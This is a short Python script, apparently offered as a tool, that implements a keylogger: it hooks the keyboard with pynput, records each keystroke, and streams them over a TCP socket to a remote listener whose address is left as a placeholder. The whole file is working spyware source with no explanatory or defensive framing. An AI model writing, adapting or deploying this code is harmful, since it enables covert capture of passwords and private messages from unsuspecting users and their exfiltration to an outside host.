from pynput import keyboard
import socket as sk

def get_info(key):
    sok.send(key.encode())

def logger(key):
    if key == keyboard.Key.space:
        x = ' '

    elif key == keyboard.Key.enter:
        x = '\n'
        
    else:
        x = (str(key))
        x = x[1:-1]
    get_info(x)

def release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

LHOST = 'xxx.xxx.xxx.xxx'
PORT = 0
server = (LHOST, PORT)

sok = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
sok.connect(server)
    
with keyboard.Listener(on_press=logger, on_release=release) as ls:
    ls.join()